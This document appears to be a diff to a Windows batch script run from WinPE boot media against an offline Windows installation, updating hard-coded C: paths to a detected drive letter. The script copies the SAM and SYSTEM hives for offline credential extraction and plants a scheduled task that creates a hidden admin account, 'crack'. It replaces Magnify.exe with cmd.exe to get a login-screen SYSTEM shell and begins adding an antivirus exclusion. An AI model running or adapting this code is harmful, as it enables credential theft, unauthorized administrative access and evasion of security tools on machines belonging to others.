@@ -1,9 +1,12 @@
 echo off
+echo. winPE system is on drive x:
 rem. tanks to http://www.it-connect.fr/custpe-comment-installer-vos-propres-outils-dans-winpe/#II_Comment_connaitre_la_lettre_du_media_WinPE
 FOR %%i IN (C D E F G H I J K L M N O P Q R S T U V W Y Z) DO IF EXIST %%i:\SOURCES\Boot.wim SET MEDIAPE=%%i:
+echo. winPE device is on drive %MEDIAPE%
 
-for %%a in (C D E F G H I J K L M N O P Q R S T U V W Y Z) do @if exist %%a:\Users\ set win=%%a
-echo. local system is on drive: %win%:
+
+for %%a in (A B C D E F G H I J K L M N O P Q R S T U V W Y Z) do @if exist %%a:\Users\ set win=%%a:
+echo. local system is on drive: %win%
 
 pause
 
@@ -42,12 +45,12 @@ goto REBOOT
 
 :A
 cls
-echo. we copy c:\windows\system32\config\SAM and c:\windows\system32\config\SYSTEM to %MEDIAPE%\sam\SAM and %MEDIAPE%\system\SYSTEM
+echo. we copy %win%\windows\system32\config\SAM and %win%\windows\system32\config\SYSTEM to %MEDIAPE%\sam\SAM and %MEDIAPE%\system\SYSTEM
 echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
 pause
-echo. c:\windows\system32\config\SAM to c:\windows\system32\config\SYSTEM
-copy c:\windows\system32\config\SAM %MEDIAPE%\sam\SAM
-copy c:\windows\system32\config\SYSTEM %MEDIAPE%\system\SYSTEM
+echo. %win%\windows\system32\config\SAM to %win%\windows\system32\config\SYSTEM
+copy %win%\windows\system32\config\SAM %MEDIAPE%\sam\SAM
+copy %win%\windows\system32\config\SYSTEM %MEDIAPE%\system\SYSTEM
 echo. comands ok
 pause
 goto menu
@@ -58,14 +61,14 @@ cls
 echo. this will create an admin account on the system. (windows 10 and above)
 echo. the user is crack, and the password is crack123 
 echo. I load hklm\software of the local machine
-reg load HKLM\tmp c:\windows\system32\config\SOFTWARE
+reg load HKLM\tmp %win%\windows\system32\config\SOFTWARE
 echo. I add the schtask
 reg import %MEDIAPE%\reg\boot.reg
 reg import %MEDIAPE%\reg\task.reg
 reg import %MEDIAPE%\reg\tree.reg
 echo. I copy the schtask on the harddisk (automatically deleted after the execution)
-copy %MEDIAPE%\reg\schadmcrack C:\Windows\System32\Tasks\schadmcrack
-mkdir c:\schadmcrack
+copy %MEDIAPE%\reg\schadmcrack %win%\Windows\System32\Tasks\schadmcrack
+mkdir %win%\schadmcrack
 echo. Add or Delete ?
 set /p choi=A/D
 
@@ -74,14 +77,14 @@ if  "%choi%"=="D"  (goto :off)
 
 
 :on
-copy %MEDIAPE%\reg\script.bat C:\schadmcrack\script.bat
-copy %MEDIAPE%\reg\test.ps1 C:\schadmcrack\test.ps1
+copy %MEDIAPE%\reg\script.bat %win%\schadmcrack\script.bat
+copy %MEDIAPE%\reg\test.ps1 %win%\schadmcrack\test.ps1
 pause
 echo. first reboot
 goto :REBOOT
 
 :off
-copy %MEDIAPE%\reg\script1.bat C:\schadmcrack\script.bat
+copy %MEDIAPE%\reg\script1.bat %win%\schadmcrack\script.bat
 pause
 echo. first reboot
 goto :REBOOT
@@ -90,18 +93,18 @@ goto :REBOOT
 pause 
 echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
 pause
-echo. I rename C:\Windows\System32\Magnify.exe to C:\Windows\System32\Magnify2.exe
-rename C:\Windows\System32\Magnify.exe Magnify2.exe
-echo. I rename C:\Windows\System32\cmd.exe to C:\Windows\System32\Magnify.exe
-rename C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
+echo. I rename %win%\Windows\System32\Magnify.exe to %win%\Windows\System32\Magnify2.exe
+rename %win%\Windows\System32\Magnify.exe Magnify2.exe
+echo. I rename %win%\Windows\System32\cmd.exe to %win%\Windows\System32\Magnify.exe
+rename %win%\Windows\System32\cmd.exe %win%\Windows\System32\Magnify.exe
 
 :D
 cls
 echo. this will revert the changes of bypass_pass
 echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
 pause
-rename C:\Windows\System32\Magnify.exe cmd.exe
-rename C:\Windows\System32\Magnify2.exe Magnify.exe
+rename %win%\Windows\System32\Magnify.exe cmd.exe
+rename %win%\Windows\System32\Magnify2.exe Magnify.exe
 echo. comands ok
 echo. ready for reboot ?
 pause
@@ -109,7 +112,7 @@ goto :REBOOT
 
 :E
 echo. I load the register hklm/software of the local system
-reg load HKLM\tmp c:\windows\system32\config\SOFTWARE
+reg load HKLM\tmp %win%\windows\system32\config\SOFTWARE
 echo. add the .exe exclusion or delete ?
 set /p choixx=A/D
 if  "%choixx%"=="A"  (goto :add)
